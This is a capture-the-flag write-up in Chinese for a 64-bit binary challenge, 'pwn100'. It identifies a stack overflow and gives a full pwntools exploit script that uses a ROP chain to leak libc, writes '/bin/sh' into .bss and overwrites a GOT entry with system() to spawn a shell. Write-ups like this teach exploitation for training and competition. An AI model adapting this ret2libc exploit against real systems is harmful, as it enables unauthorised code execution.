# pwn100 

### checksec

![1](https://img-blog.csdnimg.cn/20190611215210683.PNG)

### 寻找漏洞

![2](https://img-blog.csdnimg.cn/20190611215310787.PNG)

` sub_40063D ` 函数中获取输入存放到 `v1` ，存在栈溢出漏洞

### 攻击思路

该程序中没用system函数，也没有binsh字符串，而且参数是经过寄存器传递的，所以要通过ROP来达成泄露 `libc` ，写入 `/bin/sh` 的操作

![3](https://img-blog.csdnimg.cn/20190611215958724.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTYxMQ==,size_16,color_FFFFFF,t_70)

![4](https://img-blog.csdnimg.cn/20190611220044449.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTYxMQ==,size_16,color_FFFFFF,t_70)

寄存器 `rdi` 中存放的是写入的地址，`rsi` 是写入的字节数，所以可以通过

` pop rdi; ret`
`pop rsi; pop r15; ret`

来控制写入

### exp

```
#coding:utf-8
from pwn import *
from LibcSearcher import *

if len(sys.argv) == 3:
	io = remote(sys.argv[1],int(sys.argv[2]))
elif len(sys.argv) == 2:
	io = process(sys.argv[1])

readn = 0x40063D
start = 0x40068E
read_got = 0x601028
put_plt = 0x400500
put_got = 0x601018
length = 0x40
max_length = 200
bss = 0x601040

pop_rdi = 0x0000000000400763
pop_rsi_r15 = 0x0000000000400761

def stageone():
    payload = 'A'*length+"AAAAAAAA"+p64(pop_rdi)+p64(read_got) \
	+p64(put_plt)+p64(pop_rdi)+p64(bss) \
	+p64(pop_rsi_r15)+p64(7)+p64(0)+p64(readn)+p64(start)
    payload += "A"*(max_length-len(payload))
    io.send(payload)
    sleep(1)
    io.send("/bin/sh")
    print io.recvuntil("bye~")
    return u64(io.recv()[1:-1].ljust(8,'\0'))

read_addr = stageone()
print "read address: ", hex(read_addr)

libc = LibcSearcher("read",read_addr)
libc_base = read_addr - libc.dump("read")
system_addr = libc_base + libc.dump("system")
sys = p64(system_addr)
print "system address: ",hex(system_addr)

def stagetwo():
    payload = 'A'*length+"AAAAAAAA"+p64(pop_rdi)+p64(put_got) \
	+p64(pop_rsi_r15)+p64(len(sys))+p64(0)+p64(readn)+p64(pop_rdi)+p64(bss) \
	+p64(system_addr)+p64(start)
    payload += "A"*(max_length-len(payload))
    io.send(payload)
    print io.recv()
    io.send(sys)
    

stagetwo()
io.interactive()
```